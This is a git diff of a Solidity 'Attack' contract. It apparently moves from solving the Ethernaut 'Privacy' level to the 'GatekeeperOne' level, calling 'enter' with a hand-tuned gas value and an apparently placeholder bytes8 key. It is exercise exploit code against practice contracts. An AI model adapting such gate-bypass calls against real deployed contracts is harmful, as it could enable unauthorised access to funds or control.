@@ -1,24 +1,20 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
-import "./Privacy.sol";
+import "./GatekeeperOne.sol";
 
 contract Attack {
-    Privacy public privacyContract;
+    address public owner;
+    GatekeeperOne public gatekeeperOneContract;
 
-    constructor(address _privacyContract) {
-        privacyContract = Privacy(_privacyContract);
+    constructor(address _gatekeeperOneContract) {
+        gatekeeperOneContract = GatekeeperOne(_gatekeeperOneContract);
+
+        owner = msg.sender;
     }
 
-    function attack(bytes32 _key) public {
-        // bytes32 key;
-        // // converts string into bytes 32
-        // assembly {
-        //     key := mload(add(_key, 32))
-        // }
-
-        // converts bytes32 to bytes16
-        bytes16 finalKey = bytes16(_key);
-        privacyContract.unlock(finalKey);
+    function attack() public {
+        bytes8 key = "test";
+        gatekeeperOneContract.enter{gas: 8696}(key);
     }
 }
